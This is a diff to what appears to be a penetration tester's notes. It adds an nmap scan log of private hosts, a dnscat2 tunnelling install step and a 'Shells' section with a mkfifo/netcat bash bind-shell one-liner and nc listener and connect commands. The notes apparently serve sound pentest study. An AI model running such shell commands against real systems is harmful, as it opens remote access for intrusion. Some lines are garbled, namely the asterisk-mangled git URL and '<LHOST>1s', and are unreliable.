@@ -1,4 +1,104 @@
-x 
+
+┌──(servitor㉿omnissiah)-[~]
+└─$ sudo nmap -Pn -sS -p21,22,23,25,53,80,110,135,139,443,445,3389,5985,8080 -T4 -iL targets.txt
+[sudo] password for servitor:
+Sorry, try again.
+[sudo] password for servitor:
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-07-03 14:37 MDT
+Nmap scan report for 192.168.131.22
+Host is up.
+
+PORT     STATE    SERVICE
+21/tcp   filtered ftp
+22/tcp   filtered ssh
+23/tcp   filtered telnet
+25/tcp   filtered smtp
+53/tcp   filtered domain
+80/tcp   filtered http
+110/tcp  filtered pop3
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+443/tcp  filtered https
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+5985/tcp filtered wsman
+8080/tcp filtered http-proxy
+
+Nmap scan report for 192.168.131.25
+Host is up.
+
+PORT     STATE    SERVICE
+21/tcp   filtered ftp
+22/tcp   filtered ssh
+23/tcp   filtered telnet
+25/tcp   filtered smtp
+53/tcp   filtered domain
+80/tcp   filtered http
+110/tcp  filtered pop3
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+443/tcp  filtered https
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+5985/tcp filtered wsman
+8080/tcp filtered http-proxy
+
+Nmap scan report for 192.168.131.27
+Host is up.
+
+PORT     STATE    SERVICE
+21/tcp   filtered ftp
+22/tcp   filtered ssh
+23/tcp   filtered telnet
+25/tcp   filtered smtp
+53/tcp   filtered domain
+80/tcp   filtered http
+110/tcp  filtered pop3
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+443/tcp  filtered https
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+5985/tcp filtered wsman
+8080/tcp filtered http-proxy
+
+Nmap scan report for 192.168.131.28
+Host is up.
+
+PORT     STATE    SERVICE
+21/tcp   filtered ftp
+22/tcp   filtered ssh
+23/tcp   filtered telnet
+25/tcp   filtered smtp
+53/tcp   filtered domain
+80/tcp   filtered http
+110/tcp  filtered pop3
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+443/tcp  filtered https
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+5985/tcp filtered wsman
+8080/tcp filtered http-proxy
+
+Nmap scan report for 192.168.131.213
+Host is up.
+
+PORT     STATE    SERVICE
+21/tcp   filtered ftp
+22/tcp   filtered ssh
+23/tcp   filtered telnet
+25/tcp   filtered smtp
+53/tcp   filtered domain
+80/tcp   filtered http
+110/tcp  filtered pop3
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+443/tcp  filtered https
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+5985/tcp filtered wsman
+8080/tcp filtered http-proxy
 ## Persistence
 *Probably already with a meterpreter shell*
 
@@ -231,7 +331,7 @@ Server Start
 If you want PowerShell use `dnscat2-powershell`
 Install 
 ```
-git clone https://github.com/lukebaggett/dnscat2-powershell.git
+git clone https://github.com/lukebaggett/dnscat2-powershell.**git**********
 ```
 Importing it
 ```powershell
@@ -307,4 +407,17 @@ Proxychain through the tunnel
 ```
 proxychains nmap -sV -sT 172.16.5.19 -p3389
 ```
+## Shells
 
+TCP Bash Bind Shell
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <LHOST> <LPORT> > /tmp/f
+```
+nc listener
+```
+nc -lvnp <LPORT>
+```
+nc connection 
+```
+nc -nv <LHOST>1s <LPORT>
+```
